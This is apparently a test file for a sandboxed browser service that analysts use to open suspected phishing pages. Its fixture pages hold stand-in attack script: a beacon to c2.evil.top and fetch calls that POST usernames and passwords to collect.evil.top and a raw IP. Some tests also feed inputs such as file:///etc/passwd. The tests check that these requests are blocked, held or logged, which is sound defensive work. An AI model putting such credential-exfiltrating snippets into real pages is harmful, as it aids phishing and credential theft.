"""The isolated browser worker: needs Playwright's Chromium (its image has it).

Set BROWSER_EXECUTABLE to use another Chromium build."""

from __future__ import annotations

import base64
import json
import os
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import netlog  # noqa: E402
import nik_browser  # noqa: E402
import server  # noqa: E402

PAGE = b"""<!doctype html><html><head><title>Sign in</title></head><body>
<img src="https://cdn.evil.top/logo.png"><script>fetch('https://c2.evil.top/beacon').catch(() => {});
document.title = 'Sign in - script ran'; alert('Session expired');</script>
<form action="https://collect.evil.top/post" method="post"><input id="u" name="u"><button id="go">Go</button></form>
<a id="ext" href="https://evil.top/next" style="display:block;width:200px;height:40px">next</a>
<a id="local" href="http://10.0.0.1/admin" style="display:block;width:200px;height:40px">admin</a>
</body></html>"""


@pytest.fixture(scope="module")
def chromium():
    instance = nik_browser.Browser()
    yield instance
    for session_id in list(instance.sessions):
        instance.close(session_id, instance.sessions[session_id].owner)


def test_public_host_check():
    assert not nik_browser._public_host("10.0.0.1")
    assert not nik_browser._public_host("127.0.0.1")
    assert not nik_browser._public_host("fileserver.corp")
    assert not nik_browser._public_host("intranet")
    assert nik_browser._public_host("185.220.101.47")


def test_offline_session_runs_the_page_but_sends_nothing(chromium):
    state = chromium.open("alice", network=False, html=PAGE)
    assert state["attachment"] and state["title"] == "Sign in - script ran"
    assert base64.b64decode(state["screenshot"]).startswith(b"\xff\xd8")
    assert state["blocked"] >= 2  # the image and the beacon
    assert any(e["kind"] == "dialog" and "Session expired" in e["text"] for e in state["events"])
    # Typing goes to the page; following a link is refused without network.
    chromium.act(state["id"], "alice", {"type": "click", "x": 20, "y": 60})
    after = chromium.act(state["id"], "alice", {"type": "type", "text": "mario"})
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "https://evil.top/next"})
    assert after["title"] == "Blocked by Nik"
    assert any(e["kind"] == "blocked" and "no network" in e["text"] for e in after["events"])
    back = chromium.act(state["id"], "alice", {"type": "back"})
    assert back["attachment"]
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "mallory", {"type": "refresh"})  # another analyst's session
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "key", "key": "Control+W"})
    chromium.close(state["id"], "alice")
    assert state["id"] not in chromium.sessions


def test_network_session_never_reaches_private_addresses(chromium):
    state = chromium.open("alice", network=True, html=PAGE)
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "http://10.0.0.1/admin"})
    assert after["title"] == "Blocked by Nik"
    assert any("not a public address" in e["text"] for e in after["events"])
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "navigate", "url": "file:///etc/passwd"})
    chromium.close(state["id"], "alice")


def test_server_requires_the_token(chromium, monkeypatch):
    monkeypatch.setattr(server, "TOKEN", "test-token")
    monkeypatch.setattr(server, "BROWSER", chromium)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def post(path, body, token="test-token"):
        request = urllib.request.Request(
            base + path, data=json.dumps(body).encode(), headers={"X-Browser-Token": token}
        )
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read())

    html = base64.b64encode(PAGE).decode()
    assert post("/sessions", {"owner": "a", "html": html}, token="nope")[0] == 401
    assert post("/sessions", {"owner": "a"})[0] == 400
    assert post("/sessions", {"owner": "a", "url": "javascript:alert(1)"})[0] == 422
    status, state = post("/sessions", {"owner": "a", "html": html})
    assert status == 201 and state["network"] is False
    status, _ = post(f"/sessions/{state['id']}/action", {"owner": "a", "type": "scroll", "dy": 200})
    assert status == 200
    request = urllib.request.Request(
        f"{base}/sessions/{state['id']}?owner=a", method="DELETE", headers={"X-Browser-Token": "test-token"}
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        assert response.status == 200
    httpd.shutdown()


# --------------------------------------------------------------------------- #
# Network log                                                                 #
# --------------------------------------------------------------------------- #
FORM_PAGE = b"""<!doctype html><title>Login</title><body>
<img src="https://cdn.evil.top/logo.png">
<script>
fetch('https://collect.evil.top/api/login', {method: 'POST', headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user: 'mario', pass: 'Winter2026'})}).catch(() => {});
</script></body>"""
# A public address that needs no DNS: the submission is held before any connection.
HELD_PAGE = b"""<!doctype html><title>Held</title><body><script>
fetch('https://93.184.216.34/collect.php', {method: 'POST', body: 'pw=Winter2026'}).catch(() => {});
</script></body>"""


def _entries(chromium, session_id, owner="alice", bodies=True):
    return chromium.network(session_id, owner, 0, bodies)["entries"]


def test_offline_log_keeps_refused_requests_and_their_bodies(chromium):
    state = chromium.open("alice", network=False, html=FORM_PAGE)
    assert state["log"]["blocked"] >= 2
    entries = _entries(chromium, state["id"])
    page = next(e for e in entries if e["state"] == "local")
    assert base64.b64decode(page["response"]["body"]).startswith(b"<!doctype html>")
    post = next(e for e in entries if e["method"] == "POST")
    assert post["state"] == "blocked" and post["reason"] == "no network in this session"
    assert json.loads(base64.b64decode(post["request"]["body"])) == {"user": "mario", "pass": "Winter2026"}
    image = next(e for e in entries if e["url"].endswith("logo.png"))
    assert image["state"] == "blocked" and image["resourceType"] == "image"
    # The light list leaves the bodies out; a cursor returns only what changed.
    light = _entries(chromium, state["id"], bodies=False)
    assert all("body" not in (e.get("request") or {}) for e in light)
    cursor = chromium.network(state["id"], "alice", 0, False)["cursor"]
    assert chromium.network(state["id"], "alice", cursor, True)["entries"] == []
    with pytest.raises(nik_browser.BrowserError):
        chromium.network(state["id"], "mallory")
    chromium.close(state["id"], "alice")
    # Still readable after the session closed.
    after = chromium.network(state["id"], "alice", 0, False)
    assert after["closed"] and after["counts"]["requests"] == len(entries)


def test_network_session_holds_submissions_until_released(chromium):
    state = chromium.open("alice", network=True, html=HELD_PAGE)
    held = next(e for e in _entries(chromium, state["id"]) if e["method"] == "POST")
    assert held["state"] == "held" and base64.b64decode(held["request"]["body"]) == b"pw=Winter2026"
    assert state["log"]["held"] == 1 and state["releasePosts"] is False
    released = chromium.act(state["id"], "alice", {"type": "policy", "releasePosts": True})
    assert released["releasePosts"] is True
    chromium.close(state["id"], "alice")
    offline = chromium.open("alice", network=False, html=HELD_PAGE)
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(offline["id"], "alice", {"type": "policy", "releasePosts": True})
    chromium.close(offline["id"], "alice")


def test_bodies_are_kept_within_the_limits(monkeypatch):
    log = netlog.NetworkLog()
    monkeypatch.setattr(netlog, "BODY_MAX", 10)
    monkeypatch.setattr(netlog, "SESSION_MAX", 15)
    assert base64.b64decode(log.body(b"0123456789")["body"]) == b"0123456789"
    big = log.body(b"x" * 11)
    assert big["bodyTruncated"] and "body" not in big and big["bodySize"] == 11 and len(big["bodySha256"]) == 64
    assert log.body(b"123456")["bodyTruncated"]  # the session budget (15) is spent
    assert netlog.timing({"requestStart": 1, "responseStart": 21, "responseEnd": 30})["wait"] == 20


def test_inspect_reports_what_the_page_asks_for(chromium):
    page = (
        b"<title>Sign in</title><form action='https://collect.example/c' method='POST'>"
        b"<input name='user'><input type='password' name='pass'><button>Go</button></form>"
        b"<a href='https://example.com/'>help</a>"
    )
    state = chromium.open("alice", network=False, html=page)
    try:
        inspected = chromium.act(state["id"], "alice", {"type": "inspect"})
        facts = inspected["page"]
        assert inspected["title"] == "Sign in" and inspected["screenshot"]
        assert facts["passwordFields"] == 1 and facts["links"] == 1
        assert facts["forms"] == [
            {
                "action": "https://collect.example/c",
                "method": "post",
                "password": True,
                "inputs": ["text", "password", "submit"],
            }
        ]
    finally:
        chromium.close(state["id"], "alice")
